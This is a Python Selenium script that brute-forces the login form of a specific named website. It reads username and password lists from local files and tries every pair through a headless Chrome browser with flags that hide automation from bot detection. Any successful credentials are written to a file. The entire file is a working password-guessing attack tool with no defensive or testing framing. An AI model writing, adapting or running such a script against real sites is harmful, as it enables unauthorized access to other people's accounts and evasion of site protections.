from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.service import Service
import time
import os

# Your files are on Desktop in 'ps' folder
username_file = r"C:\Users\nasju\Desktop\s\usernames.txt"
password_file = r"C:\Users\nasju\Desktop\s\password.txt"

# Check if files exist
if not os.path.exists(username_file):
    print(f"ERROR: Username file not found: {username_file}")
    print("Make sure usernames.txt is in C:\\Users\\nasju\\Desktop\\s\\")
    exit(1)

if not os.path.exists(password_file):
    print(f"WARNING: Password file not found, using single password")
    passwords = ["wrongpass123"]
else:
    with open(password_file, "r", encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    print(f"✅ Loaded {len(passwords)} passwords")

# Read usernames
with open(username_file, "r", encoding='utf-8') as f:
    usernames = [line.strip() for line in f if line.strip()]
    
print(f"✅ Loaded {len(usernames)} usernames")
print(f"First 5 usernames: {usernames[:5]}")
print(f"First 5 passwords: {passwords[:5]}")

# Setup Chrome options
options = webdriver.ChromeOptions()
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_argument("--window-size=1920,1080")
options.add_argument("--start-maximized")
options.add_argument("--disable-notifications")
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option('useAutomationExtension', False)

# Run in headless mode for faster execution (no browser window)
options.add_argument("--headless=new")

try:
    print("🚀 Starting Chrome browser...")
    
    # Selenium 4.6+ can find ChromeDriver automatically without internet
    try:
        print("   Launching Chrome browser (auto-detecting ChromeDriver)...")
        driver = webdriver.Chrome(options=options)
        print("✅ Chrome browser started successfully!")
    except Exception as e:
        print(f"⚠️ Auto-detection failed: {e}")
        print("   Trying with explicit ChromeDriver management...")
        try:
            from selenium.webdriver.chrome.service import Service
            from webdriver_manager.chrome import ChromeDriverManager
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            print("✅ Chrome browser started with ChromeDriver manager!")
        except Exception as e2:
            print(f"❌ Both methods failed: {e2}")
            raise
    
    total_attempts = len(usernames) * len(passwords)
    attempt = 0
    
    for username in usernames:
        for password in passwords:
            attempt += 1
            print(f"\n📝 [{attempt}/{total_attempts}] Trying: {username} / {password}")
            
            try:
                driver.get("https://justiniani.infinityfree.me/index.php?view=login")
                
                WebDriverWait(driver, 5).until(
                    EC.presence_of_element_located((By.NAME, "email"))
                )
                
                email_field = driver.find_element(By.NAME, "email")
                password_field = driver.find_element(By.NAME, "password")
                
                email_field.clear()
                email_field.send_keys(username)
                password_field.clear()
                password_field.send_keys(password)
                
                password_field.submit()
                time.sleep(0.5)
                
                current_url = driver.current_url
                page_source = driver.page_source.lower()
                
                print(f"   URL: {current_url}")
                
                # Check for success
                if "dashboard" in current_url or "welcome" in page_source:
                    print(f"🎉🎉🎉 SUCCESS FOUND! Username: {username}, Password: {password} 🎉🎉🎉")
                    with open("success.txt", "w") as f:
                        f.write(f"Username: {username}\nPassword: {password}\nURL: {current_url}")
                    driver.quit()
                    exit(0)
                    
                elif "invalid email or password" in page_source:
                    print(f"❌ Failed: {username}")
                else:
                    print(f"❓ Unknown response")
                    
            except Exception as e:
                print(f"⚠️ Error on attempt: {e}")
                continue
                    
except Exception as e:
    print(f"❌ Error: {e}")
    import traceback
    traceback.print_exc()
    
finally:
    if 'driver' in locals():
        print("\n🔚 Closing browser...")
        driver.quit()
    else:
        print("\n🔚 Driver was not initialized")